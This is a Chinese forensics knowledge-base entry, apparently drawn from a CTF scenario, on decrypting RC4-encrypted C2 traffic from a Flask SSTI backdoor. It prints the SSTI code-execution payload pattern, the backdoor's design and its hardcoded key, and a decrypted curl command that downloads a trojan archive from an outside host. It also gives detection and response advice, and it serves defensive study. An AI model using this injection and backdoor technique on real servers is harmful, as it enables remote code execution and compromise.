---
id: defense-forensics-flask-ssti-rc4-backdoor-traffic-decrypt
title: Flask SSTI 注入的 RC4 加密后门：从错误处理器 payload 提取密钥并解密 C2 流量
type: scenario
domain: defense
path: defense/forensics
technique: flask-ssti-rc4-backdoor-traffic-decrypt
tags:
- forensics
- traffic-analysis
- rc4
- backdoor
- flask
- ssti
- webshell
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:35:20+08:00'
  notes: 已对照原文注入 payload 与 RC4 解密截图核对；三条 C2 命令与密钥一致；PoC 未复跑。
url: /docs/defense/forensics/defense-forensics-flask-ssti-rc4-backdoor-traffic-decrypt/
draft: false
kb_aliases:
- RC4 加密后门流量
- Flask 错误处理器后门
- X-Token-Auth 后门
- SnakeBackdoor
- v1p3r_5tr1k3_k3y
- os.popen RC4
---

## 一句话结论

攻击者通过 Flask SSTI 把一段 Python 代码注入应用，代码把 `backdoor_handler` 注册为 404 错误处理器；该后门用固定 `X-Token-Auth` 认证、把 `data` 参数按 hex 解码后用 RC4（密钥写在注入代码里）解密成命令并 `os.popen` 执行；拿到密钥后即可离线解密 pcap 中的 C2 请求，还原下载、解压、执行链。

## 原理

- **注入入口**：Flask 应用把 `preview_content` 当模板渲染，攻击者提交 `{url_for.__globals__['__builtins__']['exec']("import base64; exec(base64.b64decode('...'))")}`，经 `url_for` 的 `__globals__` 拿到 `__builtins__`，执行 Base64 编码的 Python 代码。
- **后门注册**：注入代码调用 `app._get_exc_class_and_code(404)`，把 `app.error_handler_spec[None][code][exc_class]` 设为 `lambda error: backdoor_handler()`。此后任意 404 请求都会进入后门，不需要单独的上传文件或路由。
- **后门协议**：`backdoor_handler` 先检查请求头 `X-Token-Auth` 是否等于固定值；取 `request.form['data']`，`binascii.unhexlify` 后交给 `rc4_crypt(enc_cmd, RC4_SECRET)` 解密；`os.popen(cmd).read()` 执行命令，输出再 RC4 加密并 hexlify 返回。密钥 `RC4_SECRET = b'v1p3r_5tr1k3_k3y'` 硬编码在注入代码里。
- **RC4 对称性**：KSA 初始化 256 字节 S 盒，PRGA 生成密钥流与数据异或；加密与解密是同一函数，因此拿到密钥即可还原请求和响应。
- **流量特征**：POST `/admin/settings`、`/admin/panels` 等看似正常的后台路径，带固定 `X-Token-Auth` 头和 `data=<hex>` 表单；请求/响应体都是十六进制字符串，长度与命令长度成比例。
- **命令链**：解密 `acad614e...` 得 `curl 192.168.1.201:8080/shell.zip -o /tmp/123.zip`；解密 `e0ac7e52...` 得 `/tmp/python3.13`；解密 `bab6694b...` 得 `unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip`。说明攻击者先下载压缩包，再查看 Python 版本，最后用密码解压木马。
- **为什么可取证**：后门密钥不是握手协商，而是随注入 payload 一起落在流量/服务器上；只要找到注入请求并解出 Python 代码，就能离线解密所有历史 C2 流量。

## 触发条件

- pcap/代理日志中存在 Flask 应用的异常 POST，路径像后台接口（`/admin/settings`、`/admin/panels`），带固定自定义头（如 `X-Token-Auth`）和 hex 编码的 `data` 参数。
- 能定位到注入请求（`preview_content` 中出现 `url_for.__globals__`、`__builtins__`、`exec`、Base64 长串），并解出注入代码。
- 注入代码中硬编码 RC4 密钥，或能从服务器上的后门文件提取密钥。
- 请求/响应使用同一 RC4 密钥；命令输出可能也加密。
- 有 pcap 解析能力（Wireshark/tshark/Scapy）。

## 利用步骤

1. 在流量中筛出 `preview_content` 或模板参数含 `url_for.__globals__`、`__builtins__`、`exec` 的请求，提取 Base64 字符串并解码，得到注入的 Python 代码。
2. 从代码中提取 `RC4_SECRET`、`X-Token-Auth` 固定值、后门读取的参数名（`data`）和加密/编码顺序（hex → unhexlify → RC4）。
3. 用 Wireshark 过滤器 `http.request.method == "POST" && http contains "X-Token-Auth"` 找到所有后门请求，导出 `data` 字段。
4. 对每个 `data` 做 `bytes.fromhex` → RC4 解密 → UTF-8 解码，得到命令；按时间排序还原攻击链。
5. 对响应体做同样 RC4 解密（若响应也是 hex），拿到命令输出；若响应明文则直接读取。
6. 还原出的命令中若包含压缩包密码、下载地址、木马路径，继续提取样本并做静态/动态分析。

## PoC

```python
import binascii

KEY = b"v1p3r_5tr1k3_k3y"   # 从注入 payload / 后门代码提取

def rc4_crypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def decrypt_hex(hex_data: str) -> str:
    return rc4_crypt(binascii.unhexlify(hex_data), KEY).decode("utf-8", "replace")

# 原文三条 C2 命令（hex 为流量中的 data 值）
for h in [
    "acad614ef3d82c8445d275713899f04d0d3819fc3726cf57634b189e0e95cc1f93e57656105246251f453a8396a43a6534",
    "e0ac7e52fc996cc2038c2d7a3899ed",
    "bab6694ba3c938e64b8d257b7cccce460f6347f4363ed21c300c099f129b99028eb57408024e1c32061a",
]:
    print(decrypt_hex(h))
```

原文解密结果依次为：

```text
curl 192.168.1.201:8080/shell.zip -o /tmp/123.zip
/tmp/python3.13
unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip
```

## 变体与关联

- 变体：RC4 后可再叠加 XOR/Base64（见魔改冰蝎类马）；也可能使用 AES-CBC/GCM，需按代码调整。
- 变体：密钥可能由请求头、时间戳或会话 ID 派生，而非硬编码；先从注入代码/样本中确认派生公式。
- 变体：后门不一定注册为 404 handler，也可能注册为 `before_request`、`after_request`、模板过滤器或路由；流量特征仍是固定头 + 加密参数。
- 关联：[[defense-forensics-behinder-php-rc4-xor-modified-traffic]]（PHP 魔改冰蝎 Base64+RC4+XOR 流量）、[[web-python-ssti-jinja2-flask-globals-rce]]（Flask SSTI 经 `__globals__` 到代码执行）、[[ctf-forensics-pcap-http-order-vm-opcode-reconstruction]]（从 pcap 还原后门指令）。
- 边界：若注入代码被删除、密钥未随流量落地且服务器不可访问，只能靠已知明文/密钥流分析；若响应使用不同密钥或压缩，需要分别处理。

## 检测与防御

- **应用**：不要渲染用户输入为模板；禁用/限制 `url_for.__globals__`、`__builtins__` 等属性访问；升级 Flask/Jinja2，使用沙箱模板。
- **后门检测**：监控 `app.error_handler_spec` 的动态修改、404 处理器注册、`os.popen`/`subprocess` 调用；检查 `preview_content` 等参数中的 Base64 长串和 `exec`。
- **流量检测**：固定自定义头（如 `X-Token-Auth`）+ hex 编码 POST 体 + 后台路径的组合；同一 URI 高频、请求/响应长度与命令长度相关。
- **响应**：隔离主机、保留 pcap 与样本；用密钥解密历史流量，排查下载的压缩包、解压密码和后续横向；轮换可能泄露的凭据。
